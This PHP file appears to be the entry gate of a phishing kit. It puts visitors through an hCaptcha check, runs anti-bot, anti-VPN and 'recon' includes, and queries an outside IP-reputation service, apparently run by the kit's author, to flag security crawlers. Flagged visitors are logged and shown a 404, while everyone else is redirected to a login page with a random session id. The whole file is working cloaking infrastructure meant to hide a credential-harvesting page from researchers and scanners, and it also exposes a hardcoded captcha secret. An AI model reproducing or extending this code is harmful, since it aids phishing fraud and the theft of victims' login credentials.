<?php 
	$a = 0;
	// if(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE){ 
		if ($a==1){ ?>
<?php include("default.php"); ?>
<?php }else{ ?>
<?php
   session_start();
   
   if(isset($_SESSION['captcha_passed']) && $_SESSION['captcha_passed'] =="true"){
   
   
   
   	$tanitatikaram = parse_ini_file("config.ini", true);
   	$setting_crawlerdetect=$tanitatikaram['setting_crawlerdetect'];
   	if($setting_crawlerdetect == 'on') {
   		require_once 'crawlerdetect.php';
   	}
   	$tanitatikaram = parse_ini_file("config.ini", true);
   	$setting_vpn=$tanitatikaram['setting_vpn'];
   	if($setting_vpn == 'on') {
   		require_once 'dQzVZQRhfdvmaEgR.php';
   	}
   	require_once 'QTXVrDyqUXgxaUWX.php';
   	require_once 'xPtAVmsyUtyKEpJR.php';   
   	include'darkx/antibots.php';
   	include'darkx/recon.php';
   
   	$ch=curl_init(); 
   	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
   	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
   	curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$_SESSION['ip']."?full=1");
   	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
   	curl_setopt($ch,CURLOPT_TIMEOUT,400);
   	$json=curl_exec($ch);
   
   	$ch=curl_init(); 
   	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
   	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
   	curl_setopt($ch,CURLOPT_URL,"https://spox-coder.info/spox/check_ip.php?ip=".$lp."");
   	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
   	curl_setopt($ch,CURLOPT_TIMEOUT,400);
   	$json=curl_exec($ch);
   	curl_close($ch);
   
   	$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
   	$type = trim(strip_tags(get_string_between($json,'"type":"','"')));
   
   	$key = substr(sha1(mt_rand()),1,25);
   
   	if ($check == "true") {	
   		$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
   		$save=fopen("darkx/access/bots.txt","a+");
   		fwrite($save,$content);
   		fclose($save);
   		header("HTTP/1.0 404 Not Found");exit();
   	}else {
   		$key = substr(sha1(mt_rand()),1,25); 
   		header("Location: login.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."");
   	}
   }else{ ?>
<!-- show captcha -->
<?php
   if(isset($_POST['submit'])){
   	if(isset($_POST['h-captcha-response']) && !empty($_POST['h-captcha-response'])){
   			// get verify response
   			$data = array(
   					'secret' => "0xCfE4948E9E3E0E4E5C49c59658173c9f9a6E5C6D",
   					'response' => $_POST['h-captcha-response'],
   				);
   			$verify = curl_init();
   			curl_setopt($verify, CURLOPT_URL,   "https://hcaptcha.com/siteverify");
   			curl_setopt($verify, CURLOPT_POST, true);
   			curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
   			curl_setopt($verify, CURLOPT_RETURNTRANSFER, true);
   			$verifyResponse = curl_exec($verify);
   			$responseData = json_decode($verifyResponse);
   			if($responseData->success){
   			
   				$_SESSION['captcha_passed'] = "true";
   				
   			}else{
   				$errMsg = 'hCaptcha verification failed. Please try again.';
   			}
   		}else{
   		$errMsg = 'Please click on the hCaptcha button.';
   	}
   }else{
		$errMsg = '';
		$succMsg = '';
   }
   ?>
		<html>
		<head>
			<title>Captcha </title>
			<script src="https://www.hCaptcha.com/1/api.js" async defer></script>
		</head>
		<body>
			<div>
				<center>
				<h2> Verify you are not a robot! </h2>
				<?php if(!empty($errMsg)): ?>
				<div class="errMsg"><?php echo $errMsg; ?></div>
				<?php endif; ?>
				<?php if(!empty($succMsg)): ?>
				<div class="succMsg"><?php echo $succMsg; ?></div>
				<?php endif; ?>
				<div>
					<form action="" method="POST">
					<div class="h-captcha" data-sitekey="b590f062-bbdd-409c-a51b-665f1f7ad976"></div>
					<input style="margin-top:12px;" type="submit" name="submit" value="CONTINUE">
					</form>
				</div>
				<div class="clear"> </div>
				</center>
				
			</div>
		</body>
		</html>
	<?php } ?>
<?php } ?>